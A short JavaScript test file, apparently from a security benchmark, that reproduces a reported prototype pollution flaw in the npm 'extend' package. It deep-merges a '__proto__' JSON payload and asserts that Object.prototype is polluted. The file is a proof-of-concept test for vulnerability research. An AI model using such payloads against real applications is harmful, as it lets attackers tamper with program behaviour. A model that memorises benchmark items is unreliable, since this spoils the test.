//https://hackerone.com/reports/381185
test("prototype pollution in extend ", () => {
  let extend = require("extend");
  let payload = JSON.parse(process.env.SECBENCH_PAYLOAD || process.env.SECBENCH_PAYLOAD || '{"__proto__": {"polluted": "yes"}}');

  var obj = {};

  expect({}.polluted).toBe(undefined);

  extend(true, {}, payload);
  expect({}.polluted).toBe("yes");
});
